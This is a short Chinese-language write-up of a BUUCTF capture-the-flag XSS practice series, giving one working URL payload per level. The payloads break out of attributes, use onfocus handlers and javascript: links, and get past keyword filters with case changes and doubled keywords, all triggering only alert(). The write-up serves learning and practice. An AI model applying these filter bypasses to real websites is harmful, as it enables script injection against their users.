# BUUCTF [第二章 web进阶]XSS闯关

Time:2022.5.11

## level 1

没有任何过滤。
`?name=%3Cscript%3Ealert(1)%3C/script%3E`

## level 2

前面有引号，闭合引号和 input 标签，再设置 script 标签  
`?keyword="/><script>alert(1)</script>&submit=%E6%90%9C%E7%B4%A2`  

## level 3

发现对一些特殊字符如尖括号做了 escape 编码。可以先单引号闭合，再引入一个时间来触发函数，如 onfocus，然后点击搜索框即可  
`?keyword=%27 onfocus=%27alert(1);%27&submit=%22%E6%90%9C%E7%B4%A2%22`  
一开始在 onfocus 前加了引号，咋都成功不了，然后才知道 html 标签中是没有分号的(?)，某些情况下可能有，但就我的浏览器观察，所有标签内部元素之间都没有使用分号隔离。

## level 4

写到这的时候 BUU 的环境过期了，然后重开变成了别的环境，这关是啥样也忘记了，所以算了吧。

## level 5

script 被替换为 scr_ipt，on 被替换为 o_n，没有过滤尖括号，尝试使用 JS 伪协议  
`?keyword=123"/><a href="javascript:alert('xss');">test</a>`  
点击 text 链接即可成功弹窗。

## level 6

href 被替换为 hr_ef。src -> sr_c  
然后发现没过滤大小写，href 改为 hREf 即可  
`?keyword=123"/><a hREf="javascript:alert('xss');">test</a>`  

## level 7

这次直接把 script, href, src 替换为空了，href 可以通过双写为 hrhrefef 绕过，链接中的 script 也可以双写绕过。  
`?keyword=123"/><a hrhrefef="javascscriptript:alert(1)">test</a>`  
